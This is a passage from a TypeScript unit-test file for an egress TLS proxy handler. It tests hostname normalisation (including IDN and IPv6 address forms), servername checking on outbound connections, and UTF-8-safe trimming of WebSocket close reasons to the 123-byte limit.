    await expect(handleEgressTls({ hostname: 'example.com', port: 443 }, undefined)).rejects.toMatchObject({ code: 'denied' });
  });

  test.each([
    ['Example.COM.', 'example.com'], ['bücher.de', 'xn--bcher-kva.de'], ['1.1.1.1', '1.1.1.1'], ['198.20.0.1', '198.20.0.1'],
    ['2606:4700:4700:0:0:0:0:1111', '[2606:4700:4700::1111]'], ['[2606:4700:4700::1111]', '[2606:4700:4700::1111]'],
    ['::ffff:8.8.8.8', '[::ffff:808:808]'], ['64:ff9b::101:101', '[64:ff9b::101:101]'], ['2002:101:101::', '[2002:101:101::]'],
    ['1:2:3:4:5:6:1.2.3.4', '[1:2:3:4:5:6:102:304]'],
  ])('to %p reaches %p', async (hostname, reached) => {
    dialled.length = 0;
    await handleEgressTls({ hostname, port: 443 }, PARAMS);

    expect(dialled.map((dial) => dial.hostname)).toEqual([reached]);
  });

  describe('the session it makes', () => {
    test('checks the host itself when the program named no other servername', async () => {
      dialled.length = 0;
      await handleEgressTls({ hostname: 'example.com', port: 443 }, PARAMS);

      expect(dialled).toEqual([{ hostname: 'example.com', port: 443, checks: 'example.com' }]);
    });

    test('presents and checks the program\'s servername on a connection to the host', async () => {
      dialled.length = 0;
      await handleEgressTls({ hostname: 'lb.example.com', port: 8443, servername: 'api.example.com' }, PARAMS);

      expect(dialled).toEqual([{ hostname: 'lb.example.com', port: 8443, checks: 'api.example.com' }]);
    });
  });
});

// 2026-10-12 security review: a scrubbed close reason can outgrow the server's, and close() throws past 123 bytes.
describe('a relayed WebSocket close reason', () => {
  test.each(['é'.repeat(100), `${'x'.repeat(121)}😀tail`, '界'.repeat(60), 'short reason'])('%p fits a close frame, as much of it as fits, cut only between whole code points', (reason) => {
    const bytes = (text: string) => new TextEncoder().encode(text).byteLength;
    const cut = closeReason(reason);
    const rest = reason.slice(cut.length).codePointAt(0);
    const next = rest === undefined ? undefined : String.fromCodePoint(rest);

    // RFC 6455 §5.5: a close frame's reason is at most 123 bytes of UTF-8.
    expect(bytes(cut)).toBeLessThanOrEqual(123);
    // A cut through a code point would leave a lone surrogate, which UTF-8 cannot carry.
    expect(reason.startsWith(cut) && new TextDecoder().decode(new TextEncoder().encode(cut)) === cut).toBe(true);
    expect(next === undefined || bytes(cut + next) > 123).toBe(true);
  });
});
